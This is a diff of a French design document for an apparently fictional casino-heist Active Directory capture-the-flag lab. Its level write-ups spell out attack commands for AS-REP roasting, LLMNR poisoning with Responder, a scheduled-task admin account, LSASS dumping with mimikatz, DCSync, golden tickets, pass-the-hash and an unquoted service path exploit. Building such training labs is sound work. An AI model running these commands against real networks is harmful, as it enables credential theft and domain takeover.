@@ -201,7 +201,7 @@ Les failles qui necessitent une configuration en amont :
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Level 1 (Reconnaissance NMAP) :
+Level 1 (Reconnaissance NMAP) (AD Bellagio)  :
 
 Script pour histoire du niveau :
 
@@ -227,7 +227,7 @@ Message réussite niveau : Bravo ! Votre balayage Nmap a porté ses fruits : vou
 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-Level 2 Trouver les user :
+Level 2 Trouver les user (AD Bellagio) :
 
 !!!!!!!! FOURNIR UNE LISTE DE COMPTE AD POSSIBLE AU PENTESTER !!!!!!!
 
@@ -253,7 +253,7 @@ Message réussite niveau : Félicitations ! Grâce à votre liste de 1 000 noms 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Level 3 prendre controle d'un compte sans permission (ASREP-Roasting) :
+Level 3 prendre controle d'un compte sans permission (ASREP-Roasting) (AD Bellagio)  :
 
 Script pour histoire du niveau :
 
@@ -273,7 +273,7 @@ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 Voici un flag simple à intégrer pour le Level 3, basé sur le mot de passe du service qu'on va casser :
 
-Flag (à soumettre) : Password trouvé du compte P@ssw0rd
+Flag (à soumettre) : Password trouvé du compte "svc-bella" P@ssw0rd
 
 Message réussite niveau :
 
@@ -284,7 +284,7 @@ Message réussite niveau :
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
-Level 4 : Attaque via le lien de confiance et empoisonnement SMB/LLMNR
+Level 4 (AD Bellagio) : Attaque via le lien de confiance et empoisonnement SMB/LLMNR
 
 Script pour histoire du niveau :
 
@@ -308,284 +308,212 @@ responder -i ens18
 
 Voici une idée de flag, basé sur le hash NetNTLMv2 capturé :
 
-Flag (à soumettre) :
-
-FLAG{F1E2D3C4B5A6978877665544332211FF}
-Comment le récupérer :
-
-Après avoir lancé responder -I eth0 -wrf, le log /usr/share/responder/logs/Responder-Session.log contient une ligne de ce type :
-
-[SMB] NTLMv2-SSP Client   : BackupUser-Mirage
-      NTLMv2 Response     : F1E2D3C4B5A6978877665544332211FF:1122334455667788...
-      
-Flag ici F1E2D3C4B5A6978877665544332211FF
-
-Message réussite niveau :
-Vous êtes à présent Administrateur local du serveur de backups du domaine Mirage. La route est ouverte pour couper définitivement les sauvegardes...
+Flag (à soumettre) username + password du compte sous ce format username:password (ex avec toto et password = toto:password)
 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-
-
-
-
-
-
-
-
-
-
-: Escalade de privilèges vers un compte IT Admin
+Level 5 (AD Mgm Grand) : Escalade de privilèges via une tache planifié
 
 Script pour histoire du niveau :
 
-Vous avez désormais à votre actif un ou plusieurs services de casino grâce au cassage des NTLM via ASREP-Roasting. Danny Ocean compte sur vous pour monter d’un cran : obtenir des privilèges d’administrateur local sur le serveur IT pour pouvoir déployer les outils qui couperont net les alarmes et désactiveront les logs de vigilance.
+Après avoir consolidé votre accès sur dans le casino Bellagio et pris le contrôle du serveur de sauvegarde, l’équipe d’Ocean se tourne désormais vers un nouveau terrain de jeu : Le MGM Grand. Une source à vous révèle qu’un script PowerShell s’exécute toutes les heures avec des droits élevés sur une machine membre du domaine MGM.
 
-Dans les méandres de l’Active Directory, vous découvrez que plusieurs comptes de service possèdent un SPN (Service Principal Name) et – détail crucial – sont membres du groupe local Administrators sur le serveur ITServer-<casino>. En exploitant la technique du Kerberoasting, vous allez extraire les tickets chiffrés de ces services, casser leurs mots de passe hors ligne, puis vous authentifier en tant qu’Admin IT. Une fois connecté, vous ajouterez votre propre compte pentester au groupe Administrators, ouvrant grand la porte aux modifications de configuration et à la désactivation des dispositifs de sécurité du casino.
+Votre objectif est simple : modifier le contenu du fichier de script planifié de façon à créer un compte avec assez au niveau de privilège au prochain passage de la tâche.
 
-Bienvenue dans l’antichambre des salles de contrôle : sans droits suffisants, pas de casse.
+Attaque :
+
+L'utilisateur se doit de créer un compte admin local grace a son droit de changer le fichier de script dans les taches planifiés
+
+Exemple de script : 
+```powershell
+$username = "NomUtilisateur"
+
+$password = "MotDePasse123!"
+
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+
+New-LocalUser -Name $username -Password $securePassword -FullName "Nom Complet" -Description "Utilisateur admin créé via script"
+
+Add-LocalGroupMember -Group "Administrators" -Member $username
+
+Write-Host "Utilisateur $username créé et ajouté au groupe Administrators."
+
+```
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Level 6 (AD MGM grand) : Dump mémoire LSAAS
+
+
+Script pour histoire du niveau :
+
+Après avoir créé le compte admin, l’équipe d’Ocean se trouve en position idéale pour s’attaquer à un objectif encore plus précieux : les secrets en mémoire vive du système stockés dans le processus LSASS.
+
+
+Votre mission pour ce niveau consiste donc à utiliser votre compte admin pour dumper la mémoire, puis extraire de ce dump tous les identifiants utiles (hashes NTLM, tickets Kerberos).
 
 Attaque : 
 
-GetUserSPNs.py casino.bellagio.com \
-  -request \
-  -outputfile spn_hashes.txt \
-  -dc-ip 192.168.1.10
+scp ProcDump.exe mimikatz.exe ocean-admin@MGM-SRV:C:\temp\
 
-john --wordlist=/usr/share/wordlists/rockyou.txt spn_hashes.txt
+Enter-PSSession -ComputerName MGM-SRV -Credential MGM\ocean-admin
 
-psexec.py ServiceAccount-Bellagio:SvcAppPass!23@ITServer-Bellagio
+cd C:\temp
 
-net localgroup Administrators pentester /add
+.\ProcDump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
 
-Message réussite niveau :
+Exit-PSSession
 
-vous êtes administrateur local du serveur IT et pouvez préparer la phase suivante du braquage : la désactivation des systèmes de sécurité et la collecte en toute discrétion des données critiques avant l’assaut sur les coffres. Bonne escalade !
+scp ocean-admin@MGM-SRV:C:\temp\lsass.dmp /path/to/local/
+
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
+
+
+
+
 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
-
-Il se rend compte qu'il y a un lien de confiance avec l'AD en face.
-Il est  Admin d'un groupe "IT" et possède donc les droit pour : 
-Accéder au service SMB partagé avec le second AD.
-Un utilisateur de l'autre AD se connecte tout le temps sur le partage (backups).
-Dans backup il y a un fichier txt avec ecrit "derniere connexion le : DATE" ou le mec se rend compte qu'un user se connecte toutes les minutes
-il faut donc supprimer le repertoire et le PC en face va faire un multicast pour demander le nom du repertoire
-L'atttaquant empoissone les reponses qui consiste à faire un empoisonnement de nom via les protocoles LLMNR
-ou NetBios.
-Il recupere le hash du compte XXX.
-Connexion sur le compte grace au login et au hash (pas le password).
-
-
-Level 4 (A ESSAYER ) : Attaque via le lien de confiance et empoisonnement SMB/LLMNR
+Level 7:  DCSYNC 
 
 Script pour histoire du niveau :
 
-Grâce à vos droits d’Admin IT sur le domaine casino..com, vous découvrez qu’un trust existe avec le domaine casino..com. Muni de vos privilèges, vous pouvez monter le partage \ITServer-Mirage\backups, utilisé pour les sauvegardes régulières.
+Vous avez désormais les privilèges de Domain Admin sur le domaine MGM Grand. Avec ce niveau d’accès, vous êtes à deux doigts de contrôler totalement l’infrastructure Active Directory. Cependant, pour finaliser votre emprise, il vous faut centraliser tous les secrets du domaine : mots de passe de chaque utilisateur, comptes de services, et le hash du compte krbtg...
 
-En explorant ce répertoire, vous tombez sur un fichier lastconn.txt, mis à jour chaque minute par un service de l’autre domaine pour y inscrire la date et l’heure de sa dernière connexion. Vous allez exploiter ce mécanisme pour forcer la machine distante à résoudre un nom de partage disparu, et ainsi capturer le hash NetNTLMv2 du compte qui tente de s’y reconnecter.
-
-Une fois en possession du hash, vous l’utiliserez en “pass-the-hash” pour prendre une session distante et vous garantir un accès administrateur dans le domaine Mirage, ouvrant la voie au sabotage complet des backups et à la mise hors ligne des systèmes de secours.
-
+Votre mission pour ce niveau consiste à simuler un contrôleur de domaine afin d’interroger directement l’AD. En exécutant DCSYNC depuis une machine compromise, vous ne déclencherez pas les journaux classiques d’un dump direct de la base AD, car c’est l’API Domain Replication (RPC) qui vous fournira copie des attributs sensibles (ntHash, LMHash, etc.) en tant que « réplicateur ».
 
 Attaque : 
 
-Monter le partage SMB de l’autre AD
+Grâce à l’étape précédente, vous possédez le hash NTLM (ou le ticket Kerberos) du compte Administrator@MGM. Assurez-vous d’avoir un shell administratif sur une machine du domaine (par exemple via wmiexec.py ou pth-winexe), ou d’être connecté directement sur le contrôleur de domaine.
 
-smbclient \\\\ITServer-Mirage.casino.mirage.com\\backups \
-  -U ITAdmin-Bellagio
+Choisir l’outil pour DCSYNC
+Deux méthodes courantes :
 
-  Forcer la requête de reconnection
-smb: \> rm -r backup_data
+Mimikatz (sekurlsa::dcsync)
 
-Lancer le poison LLMNR/NBNS pour capturer le hash
+Impacket (secretsdump.py – –dc-sync)
 
-responder -I eth0 -wrf
+DCSYNC avec Mimikatz
 
-Extraire le hash capturé
+Ouvrez une session sur une machine Windows où Mimikatz est disponible, avec un compte Domain Admin (ici, MGM\Administrator ou équivalent).
 
-grep "SMB-NTLMv2" /usr/share/responder/logs/Responder-Session.log \
-  | awk '{print $NF}' > captured_hash.txt
-  
+Lancez Mimikatz en mode élevé (PowerShell ou CMD « Exécuter en tant qu’administrateur »), puis exécutez :
 
-  Pass-the-hash vers la machine ITServer-Mirage
-psexec.py -hashes :`cat captured_hash.txt` \
-  BackupUser-Mirage@ITServer-Mirage.casino.mirage.com
+mimikatz.exe
+privilege::debug
+lsadump::dcsync /domain:mgm.local /all /csv /output:C:\temp\hashes_dcsync.csv
+exit
+lsadump::dcsync /domain:mgm.local /all extrait tout le set d’attributs réplicables pour tous les comptes (y compris le hash NTLM et le LMHash).
 
-  Ajouter votre compte pentester au groupe Administrators local
+Le paramètre /csv /output:… enregistre les données dans un fichier CSV (C:\temp\hashes_dcsync.csv).
 
-net localgroup Administrators pentester /add
+DCSYNC avec Impacket (secretsdump.py)
+
+Sur votre machine pentest (Linux/macOS), exécutez :
+
+secretsdump.py MGM/Administrator@"MGM-DC.mgm.local" -just-dc-user krbtgt -outputfile mgm_hashes
+Cette commande cible spécifiquement le compte krbtgt, mais vous pouvez omettre -just-dc-user krbtgt pour récupérer tous les comptes :
 
 
-Voici une idée de flag, basé sur le hash NetNTLMv2 capturé, sans faire appel au sAMAccountName :
+secretsdump.py MGM/Administrator@"MGM-DC.mgm.local" -outputfile mgm_hashes
+Le fichier mgm_hashes.ntds contiendra les hash NTLM de chaque compte, incluant celui de krbtgt.
 
-Flag (à soumettre) :
+Vérifier et extraire le hash du compte krbtgt
 
-FLAG{F1E2D3C4B5A6978877665544332211FF}
-Comment le récupérer :
+Ouvrez le fichier CSV (avec Excel, un éditeur de texte ou un script) et repérez la ligne dont UserName = krbtgt.
 
-Après avoir lancé responder -I eth0 -wrf, le log /usr/share/responder/logs/Responder-Session.log contient une ligne de ce type :
+Notez la colonne NTLMHash (et AAD_SHA si vous prévoyez un Silver Ticket).
 
-[SMB] NTLMv2-SSP Client   : BackupUser-Mirage
-      NTLMv2 Response     : F1E2D3C4B5A6978877665544332211FF:1122334455667788...
-      
-Flag ici F1E2D3C4B5A6978877665544332211FF
+Exemple de sortie tirée de Mimikatz :
 
-Message réussite niveau :
-Vous êtes à présent Administrateur local du serveur de backups du domaine Mirage. La route est ouverte pour couper définitivement les sauvegardes...
 
- 
+"MGM\krbtgt","AAD_SHA: …","NTLM: be0c07d7a82f4e1a9b7c3a5a6f7b8c9d",…
+
+Ici, le NTLM: be0c07d7a82f4e1a9b7c3a5a6f7b8c9d est la valeur qui intéresse.
+
+Centraliser tous les hashes
+
+Conservez l’ensemble des hashes NTLM dans un fichier sécurisé (mgm_all_hashes.txt) pour un usage ultérieur.
+
+Vous pourrez ensuite craquer les mots de passe si nécessaire, ou directement utiliser les hash pour passer le hash sur d’autres services du domaine.
+
+Valider la réussite du niveau 7
+
+Flag implicite : l’obtention du hash NTLM du compte krbtgt du domaine mgm.local.
+
+Documentez la valeur exacte (par exemple : krbtgt NTLM = be0c07d7a82f4e1a9b7c3a5a6f7b8c9d) et soumettez-la pour valider ce niveau.
+
+Dans certains environnements CTF, on vous demandera explicitement :
+
+Flag à soumettre : be0c07d7a82f4e1a9b7c3a5a6f7b8c9d
+
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+Level 8: Fabrication ticket Kerberos 
 
-Level 5 (A ESSAYER) : Cartographie et exploitation des chemins de privilèges avec BloodHound 
+
+Après avoir extrait le hash NTLM du compte krbtgt du domaine mgm.local lors du niveau 7, l’équipe d’Ocean détient désormais la clé ultime pour manipuler Kerberos à sa guise. En effet, le compte krbtgt est utilisé par le Key Distribution Center (KDC) pour chiffrer et signer les tickets Kerberos ; posséder son hash équivaut à pouvoir fabriquer de toutes pièces un TGT (Ticket Granting Ticket) valide pour n’importe quel utilisateur du domaine. Vous êtes donc prêts à forger un Golden Ticket, qui vous ouvrira instantanément les droits de n’importe quel compte (en particulier un compte “Domain Admin”) sur tout l’AD MGM Grand, sans jamais alerter les journaux de connexion standard.
+
+Votre mission pour ce niveau consiste à utiliser l’outil Mimikatz (ou Rubeus, selon votre préférence) pour générer un TGT factice et l’injecter dans votre session. Grâce à ce Golden Ticket, vous pourrez ensuite accéder à n’importe quel serveur du domaine MGM, extraire des secrets, créer des comptes persistants ou simplement naviguer librement dans l’infrastructure AD. Vous êtes extrêmement proches de la compromission totale de l’AD MGM Grand.
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Level 9 (AD Mirage) : Exploitation des mots de passe GPP (Group Policy Preferences)
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Level 10 (AD Mirage) : Escalade de privilèges vi un chemin sans quotes
 
 Script pour histoire du niveau :
 
-Vous avez désormais un pied dans chacun des deux domaines grâce à vos accès administratifs locaux sur ITServer- et ITServer-. Danny Ocean veut maintenant une vision globale des relations de confiance et des chemins d’escalade possibles entre les comptes pour planifier l’assaut final : trouver la clef de voûte, le compte ou le groupe dont la compromission offrirait le contrôle quasi-total des deux domaines.
+Après avoir consolidé votre accès sur dans le casino Bellagio, l’équipe d’Ocean se tourne désormais vers un nouveau terrain de jeu : Le MGM Grand. Grace a votre compte de service récupéré sur cet AD, et des reconaissances suplémentaires, vous pouvez désormais vous connecter à un PC via un service de controle à distance.
 
-Pour cela, vous allez déployer BloodHound et son agent SharpHound afin de collecter les données Active Directory — sessions ouvertes, appartenances aux groupes, droits délégués, ACL, trusts, etc. — puis analyser le graphe résultant à la recherche du chemin le plus court vers un compte à haute valeur (par exemple Domain Admins ou un Enterprise Admin).
-
-
-Attaque : 
-
-Lancer SharpHound pour la collecte de données : 
-
-Invoke-BloodHound -CollectionMethod All -Domain casino..com -ZipFileName .zip
-
-Invoke-BloodHound -CollectionMethod All -Domain casino..com -ZipFileName .zip
-
-Transférer les archives vers votre poste d’analyste : 
-
-scp Administrator@ITServer-Bellagio:data_bellagio.zip .
-scp Administrator@ITServer-Mirage:data_mirage.zip .
-
-Importer les données dans l’interface BloodHound :
-
-Ouvrez BloodHound (interface web ou application Neo4j)
-
-Dans “Data Import”, chargez successivement data_bellagio.zip puis data_mirage.zip
-
-Identifier les chemins d’escalade :
-
-Utilisez la requête “Shortest Path to Domain Admins” pour chaque domaine.
-
-Explorez les “Paths” qui traversent le trust Bellagio↔Mirage.
-
-Notez les comptes et groupes intermédiaires (par ex. IT, Backup Operators, Server Operators, etc.)
-
-Choisir le vecteur optimal:
-
-Admettons que BloodHound révèle qu’un compte BackupOperator-Mirage a un droit “AddMember” sur le groupe local Administrators du contrôleur de domaine Bellagio via le trust inversé.
-
-Exploitation finale : ajout au groupe privilégié
-
-Depuis votre session psexec sur ITServer-Mirage
-
-net group "Domain Admins" BackupOperator-Mirage /domain
+Maintenant, analysez bien ce qu'il y a sur l'ordinateur, et exploiter y une faille ....
 
 
-Voici une proposition de flag pour le Level 5, que tu pourras intégrer directement dans ton scénario :
+Attaque Unquoted Service Path : 
 
-Flag (à soumettre) :
-FLAG{BackupOperator-Mirage}
-
-Comment l’extraire ?
-
-Les joueurs importent les ZIP BloodHound et lancent la requête “Shortest Path to Domain Admins”.
-
-Ils repèrent qu’un compte BackupOperator-Mirage possède un droit “AddMember” sur le groupe Domain Admins du domaine casino.bellagio.com via le trust.
-
-Ils soumettent alors exactement le sAMAccountName trouvé, encadré par FLAG{…}, soit FLAG{BackupOperator-Mirage}.
-
-Message réussite : 
-
-Vous maîtrisez à présent les deux domaines. Le déblocage du chemin privilégié via BloodHound a permis de prendre le contrôle des groupes Domain Admins et Enterprise Admins, assurant le succès ultime du casse numérique avant l’attaque physique sur le Strip.
-
-
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+L'utilisateur se doit de créer un compte admin local grace a son droit de changer le fichier de script dans les taches planifiés
 
 
 
-Level 6 : Implantation d’une porte dérobée Kerberos sur les deux windows server  (Golden Ticket)
+Commandes :
 
-Script pour histoire du niveau :
+Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '"*"'} | Select-Object Name, DisplayName, PathName
+=> Liste les services sans quote.
 
-Vous détenez déjà un accès Domain Admin sur le domaine casino..com, et votre session pentester peut exécuter n’importe quelle action sur le contrôleur de domaine. Danny Ocean veut maintenant assurer une persistance totale, même si Terry Benedict change les mots de passe ou réinitialise les comptes : il vous faut une porte dérobée Kerberos indétectable, un Golden Ticket, qui vous permettra de générer des tickets Kerberos valides pour n’importe quel compte, à vie.
+icacls "C:\Chemin\Vers\Le\Dossier"
+=> Verifie les permission
 
-Tandis que l’équipe physique s’apprête à passer à l’assaut des coffres, c’est vous qui préparez la sortie : extraire le hash du compte krbtgt, forger un ticket doré, et l’injecter dans votre session afin d’être toujours authentifié comme un administrateur, quel que soit l’état du domaine.
+# Créer un script malveillant
+$maliciousScript = @'
+$path = "$env:USERPROFILE\Desktop\exploit.txt"
+New-Item -ItemType File -Path $path -Force
+Set-Content -Path $path -Value "Ce fichier a été créé via une exploitation de service non sécurisé."
+'@
 
-Attaque: 
+Set-Content -Path "C:\Program.exe" -Value $maliciousScript
 
-Ouvrir une session SYSTEM sur le DC :
+# Copier le script malveillant dans le répertoire cible
+Copy-Item "C:\Program.exe" -Destination "C:\Program Files\Some Folder\Program.exe"
 
-psexec.py -no-pass pentester@DC-Mirage.casino.mirage.com cmd.exe
+# Redémarrer le service vulnérable
+Restart-Service -Name "VulnerableService"
 
-Extraire le hash du compte krbtgt via DCSync :
-
-mimikatz # privilege::debug
-mimikatz # lsadump::dcsync /user:krbtgt
-
-Générer le Golden Ticket :
-
-mimikatz # kerberos::golden /domain:casino.bellagio.com \
-                         /user:Administrator \
-                         /sid:S-1-5-21-XXXXXXXXXX \
-                         /krbtgt:<KRBTGT_NTLM_HASH> \
-                         /id:500 \
-                         /groups:512,516,520 \
-                         /startoffset:0 /endin:31536000 \
-                         /ticket:golden_Administrator.krb
-
-Injecter le ticket dans votre session Kerberos :
-
-mimikatz # kerberos::ptt golden_Administrator.krb
-
-Vérifier la validité du ticket : 
-
-klist
-
-Exemple de Clé CTF a trouvé avec NTLM  a faire sur les 2 AD: 3f5d2c7a9e8b4f1a6c3e2b7d4a1f9e0b
-
-Message réussite : vous disposez d’une porte dérobée Kerberos permanente sur le domaine Mirage. Quel que soit le rollover du compte krbtgt ou les changements de mot de passe, vous pourrez toujours cultiver de nouveaux tickets pour n’importe quel utilisateur — la persistance ultime avant de passer aux niveaux suivants.
-
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-
-Level 7:
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-Level 8:
-
-Attaque WEB pour reucepre username
-
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-Level 9:
-
-Attaque DHCP DDOS commme ca les flux passent par lattaquant
-Attaque Man In The Middle
-
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-Level 10:
-
-rrelais NTLM 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Level 11:
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Level 12:
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-Level 13:
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-Level 14:
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
